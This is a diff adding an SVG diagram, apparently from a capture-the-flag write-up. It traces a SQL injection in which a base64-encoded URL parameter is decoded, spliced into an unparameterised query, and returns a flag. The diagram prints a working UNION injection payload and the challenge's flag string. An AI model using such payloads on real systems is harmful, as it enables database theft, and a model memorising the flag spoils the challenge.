@@ -1,0 +1,60 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 660 435" width="660" role="img">
+  <title>Injection path: URL parameter to flag</title>
+  <style>
+    text { font-family: 'PingFang SC', 'Microsoft YaHei', 'Noto Sans CJK SC', system-ui, sans-serif; fill: #1e293b; }
+    code { font-family: 'Cascadia Mono', Consolas, 'DejaVu Sans Mono', 'Courier New', monospace; }
+    .title { font-size: 16px; }
+    .box-line1 { font-size: 12px; }
+    .box-code1 { font-size: 11px; }
+    .box-line2 { font-size: 10px; fill: #475569; }
+    .box-code2 { font-size: 10px; fill: #475569; }
+    .arrow-label { font-size: 10px; fill: #64748b; }
+    .legend { font-size: 10px; fill: #475569; }
+  </style>
+  <defs>
+    <marker id="arrow" markerWidth="8" markerHeight="8" refX="2" refY="4" orient="auto" markerUnits="userSpaceOnUse">
+      <path d="M0,0 L8,4 L0,8 L2,4 z" fill="#64748b"/>
+    </marker>
+  </defs>
+
+  <!-- title (content center = 330, layout is symmetric) -->
+  <text x="330" y="32" text-anchor="middle" class="title">The injection path: URL parameter to flag</text>
+
+  <!-- connectors (painted before boxes) -->
+  <path d="M330,119 L 330,133" stroke="#94a3b8" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
+  <path d="M330,203 L 330,217" stroke="#94a3b8" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
+  <path d="M330,287 L 330,301" stroke="#94a3b8" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
+  <text x="344" y="129" class="arrow-label">server-side decode</text>
+  <text x="344" y="216" class="arrow-label">interpolated into the SQL string</text>
+  <text x="344" y="297" class="arrow-label">result rows looped into the page</text>
+
+  <!-- box 1: input (x=90, y=60, w=480, h=54) -->
+  <rect x="90" y="60" width="480" height="54" rx="8" fill="#dbeafe" stroke="#3b82f6" stroke-width="1.5"/>
+  <text x="330" y="82" text-anchor="middle" class="box-code1 code">GET /challenge.php?pic=eCcgVU5JT04g…</text>
+  <text x="330" y="100" text-anchor="middle" class="box-line2">payload travels base64-encoded — no quotes on the wire</text>
+
+  <!-- box 2: decode (x=90, y=144, w=480, h=54) -->
+  <rect x="90" y="144" width="480" height="54" rx="8" fill="#fef3c7" stroke="#f59e0b" stroke-width="1.5"/>
+  <text x="330" y="166" text-anchor="middle" class="box-code1 code">base64_decode($_GET['pic'])</text>
+  <text x="330" y="184" text-anchor="middle" class="box-code2 code">x' UNION SELECT note FROM secret_vault-- -</text>
+
+  <!-- box 3: injection point (x=90, y=228, w=480, h=54) -->
+  <rect x="90" y="228" width="480" height="54" rx="8" fill="#fce7f3" stroke="#ec4899" stroke-width="1.5"/>
+  <text x="330" y="250" text-anchor="middle" class="box-line1">SQL built by string interpolation (no parameters)</text>
+  <text x="330" y="268" text-anchor="middle" class="box-code2 code">WHERE name = 'x' UNION SELECT note FROM secret_vault-- -'</text>
+
+  <!-- box 4: output (x=90, y=312, w=480, h=54) -->
+  <rect x="90" y="312" width="480" height="54" rx="8" fill="#d1fae5" stroke="#22c55e" stroke-width="1.5"/>
+  <text x="330" y="334" text-anchor="middle" class="box-line1">UNION row rendered into the description card</text>
+  <text x="330" y="352" text-anchor="middle" class="box-code2 code">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</text>
+
+  <!-- legend (bottom, outside content) -->
+  <rect x="164" y="396" width="12" height="12" rx="2" fill="#dbeafe" stroke="#3b82f6"/>
+  <text x="182" y="405" class="legend">input</text>
+  <rect x="238" y="396" width="12" height="12" rx="2" fill="#fef3c7" stroke="#f59e0b"/>
+  <text x="256" y="405" class="legend">decode</text>
+  <rect x="317" y="396" width="12" height="12" rx="2" fill="#fce7f3" stroke="#ec4899"/>
+  <text x="335" y="405" class="legend">injection point</text>
+  <rect x="446" y="396" width="12" height="12" rx="2" fill="#d1fae5" stroke="#22c55e"/>
+  <text x="464" y="405" class="legend">output</text>
+</svg>
